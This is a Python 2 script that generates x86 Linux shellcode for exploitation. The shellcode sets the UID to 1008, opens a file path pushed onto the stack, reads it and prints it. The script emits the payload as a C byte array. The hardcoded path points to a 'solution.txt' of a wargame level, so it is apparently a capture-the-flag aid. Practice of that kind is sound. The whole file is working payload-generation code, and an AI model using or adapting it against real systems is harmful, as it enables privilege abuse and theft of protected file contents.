from struct import pack
import sys 

##########################################################
#
#  readfile shellcode
#  
#
#	                         random	     2014-04-21
##########################################################


##########################################################
des_format = 'shellcode | readfile | %s' 

FILENAME = ''
STDOUT = 1
ALIGN  = 4
UID = 1008

##########################################################
def descript(language):
	if language=='c':
		des = '\n\n/*  '+ des_format +'  */'
	elif language=='python':
		des = '\n\n#  '+ des_format +'  #'
	elif language=='perl':
		des = '\n\n#  '+ des_format +'  #'
	else:
		return 
	print des % (FILENAME)


def PaddingFilepath(filepath, align = ALIGN):
		newpath = ''
		sub_path =  filepath.split('/') 
		for p in sub_path:
			if len(p):
				newpath = newpath + (align - len(p) % align) * '/'  + p
		return newpath


def setuid_shellcode(userid):
	shellcode = ''
	shellcode += '\x31\xc0'													#xor eax,eax
	shellcode += '\x31\xdb'													#xor ebx,ebx
	if (userid <= 0):
		pass
	elif (userid <= 0xff):
		shellcode += '\xb3' + pack('B',userid)							#mov bl,UID
	elif (userid > 0xff):
		if not (userid & 0xFF):
			shellcode += '\x66\xbb' + pack('H',userid+1)			#mov bx,(UID+1)
			shellcode += '\x66\x4b'											#dec bx
		else:
			shellcode += '\x66\xbb' + pack('H',userid)				#mov bx,(UID)
	shellcode += '\xb0\x17'													#mov ax,0x17
	shellcode += '\xcd\x80'													#int 0x80  -----> setuid(UID)
	return shellcode

def read_shellcode(method ,filepath , r_size , fd = STDOUT):
	
	global FILENAME
	FILENAME = filepath
	if (not r_size & 0xFF) or (not r_size>>8 & 0xFF) :
		print 'r_size contains null bytes'
		return 
	if len(filepath) % 4 :
		filepath = PaddingFilepath(filepath)
	strlen = len(filepath)
	cnt = strlen / 4

	if method == 'read':
		shellcode = '\x31\xc0\x31\xd2\x31\xdb\x31\xc9'			#xor eax,eax#xor edx,edx#xor ebx,ebx#xor ecx,ecx
		shellcode += setuid_shellcode(UID)								#setuid(UID)
		#add filepath
		shellcode += '\x31\xc0\x50'											#xor eax,eax#push eax  ----->  as null bytes
		filepath = filepath[::-1]													#reverse str
		for i in xrange(cnt):
				shellcode += '\x68'												#push opcode
				shellcode += filepath[i*ALIGN:(i+1)*ALIGN][::-1]	#reverse
		shellcode += '\x89\xe3\x31\xc9\xb0\x05\xcd\x80\x89\xc6\x66\x81\xec'
		shellcode += pack('<H',(r_size))
		shellcode += '\x89\xf3\x89\xe1\x66\xba'
		shellcode += pack('<H',(r_size))
		shellcode += '\xb0\x03\xcd\x80\x31\xdb\xb3'
		shellcode += chr(fd)
		shellcode += '\x89\xe1\x89\xc2\x31\xc0\xb0\x04\xcd\x80\x31\xc0\x40\xb3\x01\xcd\x80'
	return shellcode


def getshellcode(language, shellcode):
	
	new_shellcode = ''
	if language == 'bin':
			new_shellcode = shellcode
			sys.stdout.write(new_shellcode)

	if language == 'c':
			sys.stdout.write("\nchar shellcode[] = \\\n\"")
			for i in xrange(len(shellcode)):
				tmp =  '\\'+ str(hex(ord(shellcode[i])))[1:]  
				new_shellcode += tmp
				sys.stdout.write(tmp)
				if   not (i+1) % 16 :
					sys.stdout.write("\"\n\"")
			sys.stdout.write("\";\n\n\n")
	if language == 'perl':
			pass
	if language == 'python':
			pass		



if __name__ == '__main__':
	shellcode = read_shellcode('read',filepath='/home/level/tropic/7/solution.txt',r_size=0x0101,fd = STDOUT)
	descript('c')
	getshellcode('c', shellcode)




